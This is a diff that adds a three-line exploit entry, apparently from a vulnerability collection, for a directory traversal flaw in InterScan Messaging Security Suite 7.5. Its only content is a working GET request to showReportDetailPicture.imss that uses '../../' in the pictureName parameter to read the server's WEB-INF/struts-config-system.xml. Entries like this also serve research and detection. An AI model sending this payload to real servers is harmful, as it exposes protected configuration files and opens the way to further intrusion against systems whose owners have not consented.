@@ -1,0 +1,3 @@
+InterScan Messaging Security Suite v 7.5: Directory Traversal
+
+GET /showReportDetailPicture.imss?pictureName=../../WEB-INF/struts-config-system.xml
